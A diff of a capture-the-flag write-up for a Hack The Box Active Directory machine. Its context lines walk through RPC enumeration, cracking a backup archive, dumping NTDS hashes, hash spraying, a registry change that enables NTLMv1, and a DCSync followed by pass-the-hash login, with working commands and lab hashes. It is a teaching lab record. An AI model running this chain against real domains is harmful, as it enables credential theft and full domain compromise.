@@ -19,7 +19,7 @@ PORT    STATE SERVICE
 135/tcp open  msrpc
 ```
 
-This is supposed to be an AD machine, so seeing such few ports is kinda new.&#x20;
+This is supposed to be an AD machine, so seeing such few ports is kinda new.
 
 ### Port 80
 
@@ -71,19 +71,19 @@ I wasn't sure what to do with this information. I also could not connect via `rp
 
 ### RPC Reading -> IPv6 Address
 
-Here's a resource that I used to read more about RPC.&#x20;
+Here's a resource that I used to read more about RPC.
 
 {% embed url="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements" %}
 
-Turns out, the ports 135-139 all have different purposes depsite being grouped under the SMB/RPC umbrella. Port 135 itself has specific services that are being used, and each of them sort of have their own 'interface'.&#x20;
+Turns out, the ports 135-139 all have different purposes depsite being grouped under the SMB/RPC umbrella. Port 135 itself has specific services that are being used, and each of them sort of have their own 'interface'.
 
-My question was, why is it that the only services picked up by `nmap` are port 80 and 135? From the output of `impacket-rpcdump`, there were loads of services in use like `dns.exe` and what not.&#x20;
+My question was, why is it that the only services picked up by `nmap` are port 80 and 135? From the output of `impacket-rpcdump`, there were loads of services in use like `dns.exe` and what not.
 
 I googled a bit more about RPC and found someone else's pentesting notebook that had a command I did not recognise.
 
 {% embed url="https://tenaka.gitbook.io/pentesting/enumeration/ldap-ad-dc/rpc" %}
 
-A tool called `IOXIDResolver.py` was being used.&#x20;
+A tool called `IOXIDResolver.py` was being used.
 
 {% embed url="https://github.com/mubix/IOXIDResolver" %}
 
@@ -101,7 +101,7 @@ Address: dead:beef::900f:a96c:74f4:6644
 Address: dead:beef::202
 ```
 
-We now have 2 more addresses!&#x20;
+We now have 2 more addresses!
 
 ### Re-enumeration -> SMB
 
@@ -168,7 +168,7 @@ smb: \> ls
   backup.zip                          A 10650961  Thu Sep 24 15:30:32 2020
 ```
 
-The `backup.zip` is password protected, so we can first `zip2john` it and then `john` it.&#x20;
+The `backup.zip` is password protected, so we can first `zip2john` it and then `john` it.
 
 ```
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hash   
@@ -191,7 +191,7 @@ Archive:  backup.zip
   inflating: registry/SYSTEM
 ```
 
-Interesting. We can use `secretsdump.py` to get all the hashes out, and there were A LOT. A few thousand to be specific.&#x20;
+Interesting. We can use `secretsdump.py` to get all the hashes out, and there were A LOT. A few thousand to be specific.
 
 ```
 $ impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL > hashes
@@ -201,7 +201,7 @@ There was no way the machine had 2000 users, so we need to first find out which 
 
 ### User Brute -> Hash Brute
 
-We can first use `grep` to retrieve the users present in the file. Each user's entry ends with `:::`, which we can use `grep` to retrieve and then `awk` to print out the first field.&#x20;
+We can first use `grep` to retrieve the users present in the file. Each user's entry ends with `:::`, which we can use `grep` to retrieve and then `awk` to print out the first field.
 
 ```
 $ grep ':::' hashes | awk -F ':' {'print $1'}  > users
@@ -224,7 +224,7 @@ $ ~/usefulfiles/kerbrute_linux_amd64 userenum -d htb.local --dc dc.htb.local ~/h
 
 So we do have one valid-user present. The only problem is now we need to find the correct hash for this user, of which there are 2000 hashes...
 
-We can still do roughly the same thing to get the hashes from the dump file, and then use `crackmapexec` to test the hashes.&#x20;
+We can still do roughly the same thing to get the hashes from the dump file, and then use `crackmapexec` to test the hashes.
 
 ```
 $ grep ':::' hashes | awk -F ':' {'print $4'}  > ntlm_hashes
@@ -292,7 +292,7 @@ At line:1 char:1
     + FullyQualifiedErrorId : NativeCommandFailed
 ```
 
-Windows Defender was also active on this machine because my `winpeas.exe` was deleted after.&#x20;
+Windows Defender was also active on this machine because my `winpeas.exe` was deleted after.
 
 ### NTLMv1 -> Steal Hash
 
@@ -306,7 +306,7 @@ invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemP
 ```
 {% endcode %}
 
-This command basically states that NTLMv1 is enabled on this machine instead of the more secure NTLMv2. This opens up the potential for NTLM stealing.&#x20;
+This command basically states that NTLMv1 is enabled on this machine instead of the more secure NTLMv2. This opens up the potential for NTLM stealing.
 
 {% embed url="https://dirteam.com/sander/2022/06/15/howto-detect-ntlmv1-authentication/" %}
 
@@ -326,7 +326,7 @@ We now have an NTLMv1 hash! Googling how to crack this leads me to this site:
 
 {% embed url="https://crack.sh/get-cracking/" %}
 
-This would convert it to an NTLM hash that we can pass along, of which we get `d167c3238864b12f5f82feae86a7f798`. Since this is the machine account `APT$`, we can perform a DCSync attack on the domain.&#x20;
+This would convert it to an NTLM hash that we can pass along, of which we get `d167c3238864b12f5f82feae86a7f798`. Since this is the machine account `APT$`, we can perform a DCSync attack on the domain.
 
 ```
 $ secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
@@ -338,8 +338,8 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
 ```
 
-Afterwards, we can use this hash to `evil-winrm` into the machine.&#x20;
+Afterwards, we can use this hash to `evil-winrm` into the machine.
 
 <figure><img src="../../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>
 
-A unique machine that was rather difficult for me. I definitely needed to use a writeup for this one, or I would still be stuck at the RPC part. Rooted!&#x20;
+A unique machine that was rather difficult for me. I definitely needed to use a writeup for this one, or I would still be stuck at the RPC part. Rooted!
